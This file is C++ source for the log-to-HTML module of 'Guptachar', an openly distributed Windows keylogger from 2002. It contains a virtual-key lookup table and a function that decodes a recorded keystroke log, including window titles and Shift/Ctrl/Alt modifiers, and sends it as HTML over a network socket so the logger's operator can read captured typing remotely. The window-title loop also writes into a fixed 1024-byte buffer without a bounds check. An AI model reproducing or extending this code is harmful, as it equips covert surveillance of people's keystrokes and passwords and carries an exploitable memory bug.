/*
    Guptachar Keylogging Log2HTML Module
    Copyright (C) 2002 Ayan Chakrabarti

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

    log2html.cpp 
    ============ 

    Interprets log files.
*/


#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include "glib\utils.h"

struct
{
        char * name;
        unsigned int ch;
} keylist[] = {
               {"[<-]",8},
               {"[TAB]",9},
               {"[CLEAR]",12},
               {"[ENTER]",13},
               {"[SHIFT]",16},
               {"[CTRL]",17},
               {"[ALT]",18},
               {"[PAUSE]",19},
               {"[CAPS]",20},
               {"[ESC]",27},
               {"_",32},
               {"[PGUP]",33},
               {"[PGDN]",34},
               {"[END]",35},
               {"[HOME]",36},
               {"[LEFT]",37},
               {"[UP]",38},
               {"[RIGHT]",39},
               {"[DOWN]",40},
               {"[SELECT]",41},
               {"[PRINT]",42},
               {"[EXECUTE]",43},
               {"[PRTSC]",44},
               {"[INS]",45},
               {"[DEL]",46},
               {"[HELP]",47},
               {"0",48},
               {"1",49},
               {"2",50},
               {"3",51},
               {"4",52},
               {"5",53},
               {"6",54},
               {"7",55},
               {"8",56},
               {"9",57},
               {"A",65},
               {"B",66},
               {"C",67},
               {"D",68},
               {"E",69},
               {"F",70},
               {"G",71},
               {"H",72},
               {"I",73},
               {"J",74},
               {"K",75},
               {"L",76},
               {"M",77},
               {"N",78},
               {"O",79},
               {"P",80},
               {"Q",81},
               {"R",82},
               {"S",83},
               {"T",84},
               {"U",85},
               {"V",86},
               {"W",87},
               {"X",88},
               {"Y",89},
               {"Z",90},
               {"[STARTKEY]",91},
               {"[CONTEXTKEY]",93},
               {"[NUMPAD0]",96},
               {"[NUMPAD1]",97},
               {"[NUMPAD2]",98},
               {"[NUMPAD3]",99},
               {"[NUMPAD4]",100},
               {"[NUMPAD5]",101},
               {"[NUMPAD6]",102},
               {"[NUMPAD7]",103},
               {"[NUMPAD8]",104},
               {"[NUMPAD9]",105},
               {"[MULTIPLY]",106},
               {"[ADD]",107},
               {"[SEPARATOR]",108},
               {"[SUBTRACT]",109},
               {"[DECIMAL]",110},
               {"[DIVIDE]",111},
               {"[F1]",112},
               {"[F2]",113},
               {"[F3]",114},
               {"[F4]",115},
               {"[F5]",116},
               {"[F6]",117},
               {"[F7]",118},
               {"[F8]",119},
               {"[F9]",120},
               {"[F10]",121},
               {"[F11]",122},
               {"[F12]",123},
               {"[F13]",124},
               {"[F14]",125},
               {"[F15]",126},
               {"[F16]",127},
               {"[F17]",128},
               {"[F18]",129},
               {"[F19]",130},
               {"[F20]",131},
               {"[F21]",132},
               {"[F22]",133},
               {"[F23]",134},
               {"[F24]",135},
               {"[NUM]",144},
               {"[SCRL]",145},
               {";",186},
               {"=",187},
               {",",188},
               {"-",189},
               {".",190},
               {"/",191},
               {"`",192},
               {"[",219},
               {"\\",220},
               {"]",221},
               {"'",222},
               {"[OEM_8]",223},
               {"[ICO_F17]",224},
               {"[ICO_F18]",225},
               {"[OEM102]",226},
               {"[ICO_HELP]",227},
               {"[ICO_00]",228},
               {"[ICO_CLEAR]",230},
               {"[OEM_RESET]",233},
               {"[OEM_JUMP]",234},
               {"[OEM_PA1]",235},
               {"[OEM_PA2]",236},
               {"[OEM_PA3]",237},
               {"[OEM_WSCTRL]",238},
               {"[OEM_CUSEL]",239},
               {"[OEM_ATTN]",240},
               {"[OEM_FINNISH]",241},
               {"[OEM_COPY]",242},
               {"[OEM_AUTO]",243},
               {"[OEM_ENLW]",244},
               {"[OEM_BACKTAB]",245},
               {"[ATTN]",246},
               {"[CRSEL]",247},
               {"[EXSEL]",248},
               {"[EREOF]",249},
               {"[PLAY]",250},
               {"[ZOOM]",251},
               {"[NONAME]",252},
               {"[PA1]",253},
               {"[OEM_CLEAR]",254},
               {"",0}
              };

void log2html(SOCKET s, char * fname)
{
        unsigned int i,ch,alt,shf,ctrl;
        FILE * fp;
        char wint[1024];

        fp = fopen(fname,"rb");
        if(!fp)
                return;

        ch =  fgetc(fp);

        alt = shf = ctrl = 0;

        while(!feof(fp))
        {
                        for(i = 0;keylist[i].ch != 0;i++)
                                if(keylist[i].ch == ch)
                                        break;

                       if(keylist[i].ch == 0)
                       {
                        if(ch == 0)
                        {
                              i = 0;
                              while(1)
                              {
                                        ch = fgetc(fp);
                                        if(feof(fp))
                                                break;
                                        wint[i++] = ch;
                                        if(ch == '\0')
                                                break;
                              }
        
                              sendstring(s,"<TABLE WIDTH=\"100%\" BGCOLOR=\"#aaeeaa\"><TR><TD>");
                              sendstring(s,wint);
                              sendstring(s,"</TD></TR></TABLE>\r\n");
                         }
                         else if(ch == 1)
                         {
                                alt = fgetc(fp);
                                shf = fgetc(fp);
                                ctrl = fgetc(fp);
                         }
                         ch = fgetc(fp);
                         continue;
                        }
        
                        if(shf || ctrl || alt)
                        {
                                        sendstring(s,"<FONT COLOR=RED>&lt;");
                                        if(shf)
                                                sendstring(s,"Shift+");
                                        if(ctrl)
                                                sendstring(s,"Ctrl+");
                                        if(alt)
                                                sendstring(s,"Alt+");
                        }

                        sendstring(s,keylist[i].name);

                        if(alt || shf || ctrl)
                                sendstring(s,"&gt;</FONT>");
                        alt = shf = ctrl = 0;
                        ch = fgetc(fp);
        }

        fclose(fp);
        return;
}
